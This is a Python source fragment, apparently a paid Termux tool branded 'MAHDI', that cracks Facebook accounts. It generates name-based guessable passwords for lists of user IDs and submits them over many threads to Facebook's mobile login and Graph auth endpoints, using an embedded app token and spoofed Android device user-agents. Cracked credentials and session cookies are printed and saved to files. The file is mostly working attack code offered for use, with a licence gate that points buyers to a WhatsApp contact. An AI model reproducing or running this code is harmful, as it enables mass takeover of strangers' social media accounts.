                print('\r\r\33[1;0m[MAHDI🥺-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ma4D1('/sdcard/MAHDI-CP.txt', 'a').write( uid+' | '+ps+'Loging After 7 days')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}MAHDI{x}]-[{uid}]-[%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

def mahdiold(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
               'authority': 'x.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                # 'cookie': 'sb=kRPRY45Ldv1SzIjqvuIIwbHP; datr=oxPRY9UBZC_y5Rjyj3mHzLFq; locale=en_GB; m_pixel_ratio=1; wd=1366x625; fr=0coIUb9tinAAoBzF5.AWWCo0q_ovTfWqvrghbDkUhQB6M.Bj2KMP.7f.AAA.0.0.Bj2KNP.AWXYU5zxFLE',
                'referer': 'https://x.facebook.com/',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
            }
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\n\033[1;93m--------------[MAHDI-OK💥]--------------\n\x1b[2;91mNUMBER/EMAIL👉\033[2;32m:'+uid+'\n\x1b[1;95muid➣\033[2;32m:'+cid+'\033[1;32m\033[33m   pass:\033[2;32m'+ps+'\n\x1b[0;38m[‎‎COOKIE]= \033[1;32m'+coki+'\n')
                cek_apk(session,coki)
                ma4D1('/sdcard/MAHDI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;0m[MAHDI🥺-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ma4D1('/sdcard/MAHDI-CP.txt', 'a').write( uid+' | '+ps+'Loging After 7 days')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}MAHDI{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
##########################################################################
def file():
            os.system("clear")
            print(logo)
            cnt = input('PUT FILE NAME : ')
            id = open(cnt).read().splitlines()
            os.system("clear")
            print(logo)
            tl = len(id)
            print("\033[1;91m\rUSE FLIGHT (airplane) MODE ON\033[1;96m")
            print(50*"-")
            print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
            print('\033[1;36mTOTAL IDS : \033[2;92m%s ' % len(id))
            print('\033[1;33mCRACKING STARTED.....')
            print(50*"-")
            with ThreadPool(max_workers=50) as ssbworld:
                for zsb in id: # PSYCHO PICCHI BANGLADESH HACKER
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1 or len(xz) == 2 or len(xz) == 3 or len(xz) == 5:
                            pwx = [name, xz[0]+"123",xz[0]+"1234",xz[0]+xz[1], xz[0]+"12345",name+'@123',xz[1]+'123',xz[1]+'1234']
                        else:
                            pwx = [name, xz[0]+"123",xz[0]+"1234",xz[0]+xz[1], xz[0]+"12345",name+'@123',xz[1]+'123',xz[1]+'1234']
                            pwx = ["786110",'@#@#@#','fflover','Fre Fire','freefire']
                        ssbworld.submit(rcrack,uid,pwx,tl)
                    except:
                        pass
#################################################################################
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
tan=('https')
application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
application_version_code=str(random.randint(000000000,999999999))
fbs=random.choice(fbks)
gtt=random.choice(xxxxx)
gttt=random.choice(xxxxx)
android_version=str(random.randrange(6,13))
ugen = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'



def api1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for pas in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            adid = str(uuid.uuid4())
            data = {'adid':adid,
                        'email':uid,
                        'password':pas,
                        'cpl':'true',
                        'credentials_type':'device_based_login_password',
                        "source": "device_based_login",
                        'error_detail_type':'button_with_disabled',
                        'source':'login','format':'json',
                        'generate_session_cookies':'1',
                        'generate_analytics_claim':'1',
                        'generate_machine_id':'1',
                        "locale":"es_CU","client_country_code":"CU",
                        'device':gtt,
                        'device_id':adid,
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            head = {
                        'content-type':'application/x-www-form-urlencoded',
                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                        'x-fb-connection-type':'unknown',
                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'user-agent':pro,
                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                        'x-fb-connection-quality':'EXCELLENT',
                        'x-fb-friendly-name':'authenticate',
                        'accept-encoding':'gzip, deflate',
                        'x-fb-http-engine':     'Liger'}
            url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                        print(f'\r\r\033[1;32m [MAHDI-OK] '+uid+' | '+pas+'\033[1;97m')
                        open(f'/sdcard/MAHDI-OK.txt','a').write(uid+'|'+pas+'\n')
                        #cek_apk(session,coki)
                        oks.append(uid)
                        break
            elif 'www.facebook.com' in q['error']['message']:
                        print(f'\r\r\x1b[38;5;126m [MAHDI-CP] '+uid+' | '+pas+'\033[1;97m')
                        open(f'/sdcard/MAHDI-CP.txt', 'a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
                        break
            else:
                 continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}MAHDI{x}]-{uid}-[%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
            time.sleep(10)
    except Exception as e:
            pass


    
##############################################################################
def mex():
    imt = '=MAHDI=MEX='
    os.system('clear')
    print (logo)
    
    try:
        key1 = open('/sdcard/Andoid/data/termuxd/.android.txt', 'r').read()
    except IOError:
        os.system('clear')
        print (logo)
        print ('         FUCK YOUR BYPASS SYSTEM')
        print ('\x1b[1;92m        You dont have subscrption')
        print ('          This is paid command so need to aprove')
        print ('\033[1;92m         If you want to buy presh enter')
        print ('')
        myid = uuid.uuid4().hex[:10]
        print ('         YOUR KEY :\033[1;93m ' + myid + imt)
        kok = open('/sdcard/Andoid/data/termuxd/.android.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ('')
        input('   \x1b[0;34mENTER TO BUY TOOLS ')
        os.system('am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDi%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/mahdi-mex/main/ap.txt').text
    if key1 in r:
        print("\33[1;32mYour Token is Successfully Approved")
        time.sleep(0.5)
        mahdistr()
    else:
        os.system('clear')
        print (logo)
        print ('         FUCK YOUR BYPASS SYSTEM')
        print('')
        print ('         You dont have subscrption')
        print ('         THIS IS PAID COMMAND ')
        print ('')
        print ('         YOUR KEY : \033[1;93m' + key1)
        print ('')
        print ('        \x1b[0;34mIF YOU BUY TOOLS CONTACT ME')
        print ('')
        input('\033[1;92mIf you want to buy presh entero ')
        os.system('am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20MAHDi%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
##################
 
   
if __name__ == '__main__':
    mex()                                                                  